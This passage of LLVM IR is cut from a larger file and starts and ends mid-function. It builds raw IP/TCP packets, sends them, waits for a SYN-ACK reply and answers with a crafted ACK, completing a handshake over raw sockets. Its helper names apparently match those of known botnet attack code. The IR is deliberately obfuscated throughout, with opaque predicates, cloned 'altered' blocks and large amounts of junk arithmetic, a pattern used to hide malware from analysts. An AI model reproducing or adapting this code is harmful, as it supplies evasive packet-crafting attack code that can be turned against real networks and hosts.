  %187 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %186, i32 0, i32 3
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @ntohl(i32 %188) #9
  %190 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %190, i32 0, i32 0
  %192 = bitcast %union.anon* %191 to %struct.anon.0*
  %193 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %192, i32 0, i32 2
  %194 = load i32, i32* %193, align 4
  %195 = call i32 @ntohl(i32 %194) #9
  %196 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i32 0, i32 0), i32 %189, i32 %195)
  %197 = load i32, i32* %16, align 4
  %198 = getelementptr inbounds [40 x i8], [40 x i8]* %24, i32 0, i32 0
  %199 = bitcast %union.__CONST_SOCKADDR_ARG* %31 to %struct.sockaddr**
  %200 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %200, %struct.sockaddr** %199, align 8
  %201 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %31, i32 0, i32 0
  %202 = load %struct.sockaddr*, %struct.sockaddr** %201, align 8
  %203 = call i64 @sendto(i32 %197, i8* %198, i64 40, i32 16384, %struct.sockaddr* %202, i32 16)
  %204 = trunc i64 %203 to i32
  store i32 %204, i32* %30, align 4
  %205 = load i32, i32* %30, align 4
  %206 = icmp eq i32 %205, -1
  %207 = load i32, i32* @x.21
  %208 = load i32, i32* @y.22
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %206, label %215, label %216

; <label>:215:                                    ; preds = %originalBBpart2
  store i32 0, i32* %14, align 4
  br label %479

; <label>:216:                                    ; preds = %originalBBpart2
  %217 = getelementptr inbounds [512 x i8], [512 x i8]* %26, i32 0, i32 0
  %218 = bitcast i8* %217 to %struct.iphdr*
  store %struct.iphdr* %218, %struct.iphdr** %27, align 8
  %219 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i64 1
  %221 = bitcast %struct.iphdr* %220 to %struct.tcphdr*
  store %struct.tcphdr* %221, %struct.tcphdr** %28, align 8
  store i32 0, i32* %32, align 4
  %222 = getelementptr inbounds %struct.timeval, %struct.timeval* %33, i32 0, i32 0
  store i64 5, i64* %222, align 8
  %223 = getelementptr inbounds %struct.timeval, %struct.timeval* %33, i32 0, i32 1
  store i64 0, i64* %223, align 8
  %224 = load i32, i32* %16, align 4
  %225 = bitcast %struct.timeval* %33 to i8*
  %226 = call i32 @setsockopt(i32 %224, i32 1, i32 20, i8* %225, i32 16) #8
  store i32 %226, i32* %30, align 4
  %227 = load i32, i32* %30, align 4
  %228 = icmp eq i32 %227, -1
  br i1 %228, label %229, label %230

; <label>:229:                                    ; preds = %216
  store i32 0, i32* %14, align 4
  br label %479

; <label>:230:                                    ; preds = %216
  br label %231

; <label>:231:                                    ; preds = %456, %230
  %232 = load i32, i32* @x.21
  %233 = load i32, i32* @y.22
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %231
  %240 = load i32, i32* %32, align 4
  %241 = icmp slt i32 %240, 10000
  %242 = load i32, i32* @x.21
  %243 = load i32, i32* @y.22
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %241, label %250, label %459

; <label>:250:                                    ; preds = %originalBBpart2100
  %251 = load i32, i32* %16, align 4
  %252 = getelementptr inbounds [512 x i8], [512 x i8]* %26, i32 0, i32 0
  %253 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %253, align 8
  %254 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %255 = load %struct.sockaddr*, %struct.sockaddr** %254, align 8
  %256 = call i64 @recvfrom(i32 %251, i8* %252, i64 512, i32 16384, %struct.sockaddr* %255, i32* null)
  %257 = trunc i64 %256 to i32
  store i32 %257, i32* %30, align 4
  %258 = load i32, i32* %30, align 4
  %259 = icmp eq i32 %258, -1
  br i1 %259, label %260, label %277

; <label>:260:                                    ; preds = %250
  %261 = load i32, i32* @x.21
  %262 = load i32, i32* @y.22
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %260
  %269 = load i32, i32* @x.21
  %270 = load i32, i32* @y.22
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br label %459

; <label>:277:                                    ; preds = %250
  %278 = load i32, i32* @x.21
  %279 = load i32, i32* @y.22
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %277
  %286 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 8
  %288 = load i32, i32* %287, align 4
  %289 = load i32, i32* %17, align 4
  %290 = icmp eq i32 %288, %289
  %291 = load i32, i32* @x.21
  %292 = load i32, i32* @y.22
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %290, label %299, label %456

; <label>:299:                                    ; preds = %originalBBpart2108
  %300 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %301 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %300, i32 0, i32 0
  %302 = bitcast %union.anon* %301 to %struct.anon.0*
  %303 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %302, i32 0, i32 4
  %304 = load i16, i16* %303, align 4
  %305 = lshr i16 %304, 12
  %306 = and i16 %305, 1
  %307 = zext i16 %306 to i32
  %308 = icmp eq i32 %307, 1
  br i1 %308, label %309, label %456

; <label>:309:                                    ; preds = %299
  %310 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 0
  %312 = bitcast %union.anon* %311 to %struct.anon.0*
  %313 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %312, i32 0, i32 4
  %314 = load i16, i16* %313, align 4
  %315 = lshr i16 %314, 9
  %316 = and i16 %315, 1
  %317 = zext i16 %316 to i32
  %318 = icmp eq i32 %317, 1
  br i1 %318, label %319, label %456

; <label>:319:                                    ; preds = %309
  %320 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %321 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon* %321 to %struct.anon.0*
  %323 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %322, i32 0, i32 3
  %324 = load i32, i32* %323, align 4
  %325 = call i32 @ntohl(i32 %324) #9
  %326 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %327 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %326, i32 0, i32 0
  %328 = bitcast %union.anon* %327 to %struct.anon.0*
  %329 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %328, i32 0, i32 2
  %330 = load i32, i32* %329, align 4
  %331 = call i32 @ntohl(i32 %330) #9
  %332 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i32 0, i32 0), i32 %325, i32 %331)
  %333 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %334 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %333, i32 0, i32 0
  %335 = bitcast %union.anon* %334 to %struct.anon.0*
  %336 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %335, i32 0, i32 2
  %337 = load i32, i32* %336, align 4
  %338 = call i32 @ntohl(i32 %337) #9
  %339 = add i32 %338, 1
  %340 = call i32 @htonl(i32 %339) #9
  store i32 %340, i32* %35, align 4
  %341 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %342 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %341, i32 0, i32 0
  %343 = bitcast %union.anon* %342 to %struct.anon.0*
  %344 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %343, i32 0, i32 3
  %345 = load i32, i32* %344, align 4
  store i32 %345, i32* %36, align 4
  %346 = getelementptr inbounds [40 x i8], [40 x i8]* %25, i32 0, i32 0
  %347 = bitcast i8* %346 to %struct.iphdr*
  store %struct.iphdr* %347, %struct.iphdr** %27, align 8
  %348 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %349 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %348, i64 1
  %350 = bitcast %struct.iphdr* %349 to %struct.tcphdr*
  store %struct.tcphdr* %350, %struct.tcphdr** %28, align 8
  %351 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %352 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %351, i32 0, i32 0
  %353 = bitcast %union.anon* %352 to %struct.anon.0*
  %354 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %353, i32 0, i32 4
  %355 = load i16, i16* %354, align 4
  %356 = and i16 %355, -4097
  %357 = or i16 %356, 4096
  store i16 %357, i16* %354, align 4
  %358 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  %360 = bitcast %union.anon* %359 to %struct.anon.0*
  %361 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %360, i32 0, i32 4
  %362 = load i16, i16* %361, align 4
  %363 = and i16 %362, -257
  store i16 %363, i16* %361, align 4
  %364 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 0
  %366 = bitcast %union.anon* %365 to %struct.anon.0*
  %367 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %366, i32 0, i32 4
  %368 = load i16, i16* %367, align 4
  %369 = and i16 %368, -8193
  store i16 %369, i16* %367, align 4
  %370 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i32 0, i32 0
  %372 = bitcast %union.anon* %371 to %struct.anon.0*
  %373 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %372, i32 0, i32 4
  %374 = load i16, i16* %373, align 4
  %375 = and i16 %374, -2049
  store i16 %375, i16* %373, align 4
  %376 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %377 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %376, i32 0, i32 0
  %378 = bitcast %union.anon* %377 to %struct.anon.0*
  %379 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %378, i32 0, i32 4
  %380 = load i16, i16* %379, align 4
  %381 = and i16 %380, -1025
  store i16 %381, i16* %379, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 0
  %384 = bitcast %union.anon* %383 to %struct.anon.0*
  %385 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = and i16 %386, -513
  store i16 %387, i16* %385, align 4
  %388 = load i32, i32* %35, align 4
  %389 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 0
  %391 = bitcast %union.anon* %390 to %struct.anon.0*
  %392 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %391, i32 0, i32 3
  store i32 %388, i32* %392, align 4
  %393 = load i32, i32* %36, align 4
  %394 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 0
  %396 = bitcast %union.anon* %395 to %struct.anon.0*
  %397 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %396, i32 0, i32 2
  store i32 %393, i32* %397, align 4
  %398 = call i32 @rand_new()
  %399 = and i32 %398, 65535
  %400 = trunc i32 %399 to i16
  %401 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 3
  store i16 %400, i16* %402, align 4
  %403 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 7
  store i16 0, i16* %404, align 2
  %405 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %406 = bitcast %struct.iphdr* %405 to i16*
  %407 = call zeroext i16 @checksum_generic(i16* %406, i32 20)
  %408 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 7
  store i16 %407, i16* %409, align 2
  %410 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon* %411 to %struct.anon.0*
  %413 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %412, i32 0, i32 6
  store i16 0, i16* %413, align 4
  %414 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %415 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %416 = bitcast %struct.tcphdr* %415 to i8*
  %417 = call zeroext i16 @htons(i16 zeroext 20) #9
  %418 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %414, i8* %416, i16 zeroext %417, i32 20)
  %419 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %420 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %419, i32 0, i32 0
  %421 = bitcast %union.anon* %420 to %struct.anon.0*
  %422 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %421, i32 0, i32 6
  store i16 %418, i16* %422, align 4
  %423 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %423, align 4
  %424 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 0
  %426 = bitcast %union.anon* %425 to %struct.anon.0*
  %427 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %426, i32 0, i32 1
  %428 = load i16, i16* %427, align 2
  %429 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %428, i16* %429, align 2
  %430 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %431 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %430, i32 0, i32 9
  %432 = load i32, i32* %431, align 4
  %433 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %434 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %433, i32 0, i32 0
  store i32 %432, i32* %434, align 4
  %435 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %436 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %435, i32 0, i32 0
  %437 = bitcast %union.anon* %436 to %struct.anon.0*
  %438 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %437, i32 0, i32 3
  %439 = load i32, i32* %438, align 4
  %440 = call i32 @ntohl(i32 %439) #9
  %441 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %442 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %441, i32 0, i32 0
  %443 = bitcast %union.anon* %442 to %struct.anon.0*
  %444 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %443, i32 0, i32 2
  %445 = load i32, i32* %444, align 4
  %446 = call i32 @ntohl(i32 %445) #9
  %447 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i32 0, i32 0), i32 %440, i32 %446)
  %448 = load i32, i32* %16, align 4
  %449 = getelementptr inbounds [40 x i8], [40 x i8]* %25, i32 0, i32 0
  %450 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %451 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %451, %struct.sockaddr** %450, align 8
  %452 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %453 = load %struct.sockaddr*, %struct.sockaddr** %452, align 8
  %454 = call i64 @sendto(i32 %448, i8* %449, i64 40, i32 16384, %struct.sockaddr* %453, i32 16)
  %455 = trunc i64 %454 to i32
  store i32 %455, i32* %30, align 4
  br label %459

; <label>:456:                                    ; preds = %309, %299, %originalBBpart2108
  %457 = load i32, i32* %32, align 4
  %458 = add nsw i32 %457, 1
  store i32 %458, i32* %32, align 4
  br label %231

; <label>:459:                                    ; preds = %319, %originalBBpart2104, %originalBBpart2100
  %460 = load i32, i32* @x.21
  %461 = load i32, i32* @y.22
  %462 = sub i32 %460, 1
  %463 = mul i32 %460, %462
  %464 = urem i32 %463, 2
  %465 = icmp eq i32 %464, 0
  %466 = icmp slt i32 %461, 10
  %467 = or i1 %465, %466
  br i1 %467, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %459
  %468 = load i32, i32* %30, align 4
  %469 = icmp eq i32 %468, -1
  %470 = select i1 %469, i32 0, i32 1
  store i32 %470, i32* %14, align 4
  %471 = load i32, i32* @x.21
  %472 = load i32, i32* @y.22
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br label %479

; <label>:479:                                    ; preds = %originalBBpart2112, %229, %215
  %480 = load i32, i32* %14, align 4
  ret i32 %480

originalBBalteredBB:                              ; preds = %originalBB, %5
  %481 = alloca i32, align 4
  %482 = alloca i16, align 2
  %483 = alloca i32, align 4
  %484 = alloca i32, align 4
  %485 = alloca i32, align 4
  %486 = alloca i32, align 4
  %487 = alloca i32, align 4
  %488 = alloca i32, align 4
  %489 = alloca i32, align 4
  %490 = alloca i32, align 4
  %491 = alloca [40 x i8], align 16
  %492 = alloca [40 x i8], align 16
  %493 = alloca [512 x i8], align 16
  %494 = alloca %struct.iphdr*, align 8
  %495 = alloca %struct.tcphdr*, align 8
  %496 = alloca %struct.sockaddr_in, align 4
  %497 = alloca i32, align 4
  %498 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %499 = alloca i32, align 4
  %500 = alloca %struct.timeval, align 8
  %501 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %502 = alloca i32, align 4
  %503 = alloca i32, align 4
  %504 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i16 %0, i16* %482, align 2
  store i32 %1, i32* %483, align 4
  store i32 %2, i32* %484, align 4
  store i32 %3, i32* %485, align 4
  store i32 %4, i32* %486, align 4
  store i32 64, i32* %487, align 4
  store i32 5, i32* %488, align 4
  store i32 4, i32* %489, align 4
  %505 = call i32 @rand_new()
  %_ = sub i32 0, %505
  %gen = add i32 %_, 65535
  %_1 = shl i32 %505, 65535
  %506 = and i32 %505, 65535
  store i32 %506, i32* %490, align 4
  %507 = bitcast [40 x i8]* %491 to i8*
  call void @llvm.memset.p0i8.i64(i8* %507, i8 0, i64 40, i32 16, i1 false)
  %508 = bitcast [40 x i8]* %492 to i8*
  call void @llvm.memset.p0i8.i64(i8* %508, i8 0, i64 40, i32 16, i1 false)
  %509 = bitcast [512 x i8]* %493 to i8*
  call void @llvm.memset.p0i8.i64(i8* %509, i8 0, i64 512, i32 16, i1 false)
  store i32 0, i32* %497, align 4
  %510 = getelementptr inbounds [40 x i8], [40 x i8]* %491, i32 0, i32 0
  %511 = bitcast i8* %510 to %struct.iphdr*
  store %struct.iphdr* %511, %struct.iphdr** %494, align 8
  %512 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %513 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %512, i64 1
  %514 = bitcast %struct.iphdr* %513 to %struct.tcphdr*
  store %struct.tcphdr* %514, %struct.tcphdr** %495, align 8
  %515 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %516 = bitcast %struct.iphdr* %515 to i8*
  %517 = load i8, i8* %516, align 4
  %_2 = sub i8 0, %517
  %gen3 = add i8 %_2, -16
  %_4 = sub i8 0, %517
  %gen5 = add i8 %_4, -16
  %_6 = shl i8 %517, -16
  %_7 = shl i8 %517, -16
  %_8 = shl i8 %517, -16
  %_9 = shl i8 %517, -16
  %518 = and i8 %517, -16
  %_10 = sub i8 0, %518
  %gen11 = add i8 %_10, 5
  %_12 = sub i8 %518, 5
  %gen13 = mul i8 %_12, 5
  %_14 = sub i8 %518, 5
  %gen15 = mul i8 %_14, 5
  %_16 = shl i8 %518, 5
  %_17 = sub i8 %518, 5
  %gen18 = mul i8 %_17, 5
  %_19 = shl i8 %518, 5
  %519 = or i8 %518, 5
  store i8 %519, i8* %516, align 4
  %520 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %521 = bitcast %struct.iphdr* %520 to i8*
  %522 = load i8, i8* %521, align 4
  %_20 = sub i8 0, %522
  %gen21 = add i8 %_20, 15
  %_22 = sub i8 0, %522
  %gen23 = add i8 %_22, 15
  %_24 = shl i8 %522, 15
  %_25 = shl i8 %522, 15
  %_26 = shl i8 %522, 15
  %_27 = shl i8 %522, 15
  %523 = and i8 %522, 15
  %_28 = sub i8 %523, 64
  %gen29 = mul i8 %_28, 64
  %524 = or i8 %523, 64
  store i8 %524, i8* %521, align 4
  %525 = call zeroext i16 @htons(i16 zeroext 40) #9
  %526 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 2
  store i16 %525, i16* %527, align 2
  %528 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 5
  store i8 64, i8* %529, align 4
  %530 = load %struct.iphdr*, %struct.iphdr** %494, align 8
  %531 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %530, i32 0, i32 6
  store i8 6, i8* %531, align 1
  %532 = load i16, i16* %482, align 2
  %533 = call zeroext i16 @htons(i16 zeroext %532) #9
  %534 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %535 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %534, i32 0, i32 0
  %536 = bitcast %union.anon* %535 to %struct.anon.0*
  %537 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %536, i32 0, i32 1
  store i16 %533, i16* %537, align 2
  %538 = load i32, i32* %486, align 4
  %539 = trunc i32 %538 to i16
  %540 = call zeroext i16 @htons(i16 zeroext %539) #9
  %541 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %542 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %541, i32 0, i32 0
  %543 = bitcast %union.anon* %542 to %struct.anon.0*
  %544 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %543, i32 0, i32 0
  store i16 %540, i16* %544, align 4
  %545 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %546 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %545, i32 0, i32 0
  %547 = bitcast %union.anon* %546 to %struct.anon.0*
  %548 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %547, i32 0, i32 4
  %549 = load i16, i16* %548, align 4
  %_30 = shl i16 %549, -241
  %550 = and i16 %549, -241
  %_31 = sub i16 %550, 80
  %gen32 = mul i16 %_31, 80
  %_33 = shl i16 %550, 80
  %_34 = sub i16 0, %550
  %gen35 = add i16 %_34, 80
  %551 = or i16 %550, 80
  store i16 %551, i16* %548, align 4
  %552 = call i32 @rand_new()
  %_36 = sub i32 0, %552
  %gen37 = add i32 %_36, 65535
  %_38 = sub i32 %552, 65535
  %gen39 = mul i32 %_38, 65535
  %_40 = shl i32 %552, 65535
  %_41 = sub i32 0, %552
  %gen42 = add i32 %_41, 65535
  %_43 = sub i32 %552, 65535
  %gen44 = mul i32 %_43, 65535
  %553 = and i32 %552, 65535
  %554 = trunc i32 %553 to i16
  %555 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %556 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %555, i32 0, i32 0
  %557 = bitcast %union.anon* %556 to %struct.anon.0*
  %558 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %557, i32 0, i32 5
  store i16 %554, i16* %558, align 2
  %559 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %560 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %559, i32 0, i32 0
  %561 = bitcast %union.anon* %560 to %struct.anon.0*
  %562 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %561, i32 0, i32 4
  %563 = load i16, i16* %562, align 4
  %_45 = sub i16 0, %563
  %gen46 = add i16 %_45, -4097
  %_47 = sub i16 %563, -4097
  %gen48 = mul i16 %_47, -4097
  %_49 = sub i16 %563, -4097
  %gen50 = mul i16 %_49, -4097
  %564 = and i16 %563, -4097
  store i16 %564, i16* %562, align 4
  %565 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %566 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %565, i32 0, i32 0
  %567 = bitcast %union.anon* %566 to %struct.anon.0*
  %568 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %567, i32 0, i32 4
  %569 = load i16, i16* %568, align 4
  %_51 = sub i16 %569, -257
  %gen52 = mul i16 %_51, -257
  %_53 = sub i16 %569, -257
  %gen54 = mul i16 %_53, -257
  %_55 = sub i16 0, %569
  %gen56 = add i16 %_55, -257
  %_57 = sub i16 0, %569
  %gen58 = add i16 %_57, -257
  %_59 = sub i16 0, %569
  %gen60 = add i16 %_59, -257
  %_61 = sub i16 0, %569
  %gen62 = add i16 %_61, -257
  %_63 = shl i16 %569, -257
  %_64 = shl i16 %569, -257
  %_65 = sub i16 0, %569
  %gen66 = add i16 %_65, -257
  %_67 = shl i16 %569, -257
  %570 = and i16 %569, -257
  store i16 %570, i16* %568, align 4
  %571 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %572 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %571, i32 0, i32 0
  %573 = bitcast %union.anon* %572 to %struct.anon.0*
  %574 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %573, i32 0, i32 4
  %575 = load i16, i16* %574, align 4
  %_68 = sub i16 %575, -8193
  %gen69 = mul i16 %_68, -8193
  %_70 = sub i16 %575, -8193
  %gen71 = mul i16 %_70, -8193
  %_72 = shl i16 %575, -8193
  %_73 = sub i16 0, %575
  %gen74 = add i16 %_73, -8193
  %_75 = sub i16 0, %575
  %gen76 = add i16 %_75, -8193
  %_77 = shl i16 %575, -8193
  %_78 = shl i16 %575, -8193
  %576 = and i16 %575, -8193
  store i16 %576, i16* %574, align 4
  %577 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 0
  %579 = bitcast %union.anon* %578 to %struct.anon.0*
  %580 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %579, i32 0, i32 4
  %581 = load i16, i16* %580, align 4
  %_79 = shl i16 %581, -2049
  %_80 = sub i16 0, %581
  %gen81 = add i16 %_80, -2049
  %_82 = sub i16 %581, -2049
  %gen83 = mul i16 %_82, -2049
  %582 = and i16 %581, -2049
  store i16 %582, i16* %580, align 4
  %583 = load %struct.tcphdr*, %struct.tcphdr** %495, align 8
  %584 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %583, i32 0, i32 0
  %585 = bitcast %union.anon* %584 to %struct.anon.0*
  %586 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %585, i32 0, i32 4
  %587 = load i16, i16* %586, align 4
  %_84 = shl i16 %587, -1025
  %588 = and i16 %587, -1025
  store i16 %588, i16* %586, align 4
